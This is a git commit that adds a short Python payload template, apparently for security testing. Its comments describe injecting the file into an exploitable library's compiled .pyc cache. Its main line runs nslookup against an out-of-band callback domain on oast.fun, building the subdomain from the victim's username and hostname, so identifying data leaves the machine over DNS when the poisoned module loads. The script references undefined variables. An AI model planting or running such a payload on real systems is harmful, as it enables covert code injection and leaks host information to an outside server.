80089303a2e981cfd458fe0574a7d5478bfea032
nightrad.io <sasha.zivojinovic+one@gmail.com>
2026-02-17 09:06:06 +0100

    Create template_oast.py for DNS lookup
    Add a script to perform a DNS lookup with nslookup.

---
+++ template_oast.py
@@ -0,0 +1,10 @@
+import subprocess
+import os
+import socket
+#an example script to stomp over exploitable .pyc files. *should* be operating system agnostic.
+#python3 pyc_stomp.py inject /path/exploitable/lib/__pycache___/__init__.pyc template_oast.py
+
+subprocess.run(['nslookup', f"{username}-{hostname}.vhhbufdadgadyujvdeadbeefv4r8m0mop.oast.fun"], capture_output=False)
+
+if __name__ == "__main__":
+    print("Running as main")
